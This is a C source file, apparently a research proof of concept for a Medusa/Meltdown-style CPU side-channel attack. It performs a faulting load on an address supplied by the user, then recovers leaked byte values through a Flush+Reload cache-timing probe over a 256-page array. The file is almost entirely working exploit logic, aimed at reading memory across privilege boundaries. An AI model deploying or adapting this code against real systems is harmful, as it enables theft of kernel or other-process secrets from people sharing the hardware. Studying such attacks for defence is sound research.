#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdlib.h>
#include <time.h>
#include <pthread.h>
#include <sched.h>
#include <sys/mman.h>
#include <setjmp.h>

#include "medusa.h"

#define PAGE_SIZE 4096

uint8_t probe_array[256*PAGE_SIZE] = {0};

extern void s_faulty_load(size_t addr);

void setup_probe_array(){
  for(int i = 0; i < 256*4096; i++){
    probe_array[i] = 0;
  }
}

void run_nop(){
  asm volatile("nop\n nop\n");
}

int main(int argc, char *argv[]){

  volatile size_t addr = strtoull(argv[1], NULL, 0);//virtual address

  set_pages();
  setup_fh();
  setup_probe_array();

  for(int tries = 0; tries < 400; tries++){
    for(int i = 0; i < 256; i++){
      flush(&probe_array[i*PAGE_SIZE]);
    }

    if(!setjmp(trycatch_buf)){
      s_faulty_load(addr);
    }

    for(int i = 0; i < 256; i++){
      uint64_t time = probe(&probe_array[ i * 4096 ] );

      if(time < 140 && i != 0){
	  if(!setjmp(trycatch_buf)){
               	      
	  }

          printf("0x%zx,", i);
          fflush(stdout);
      }
    }
  }
}
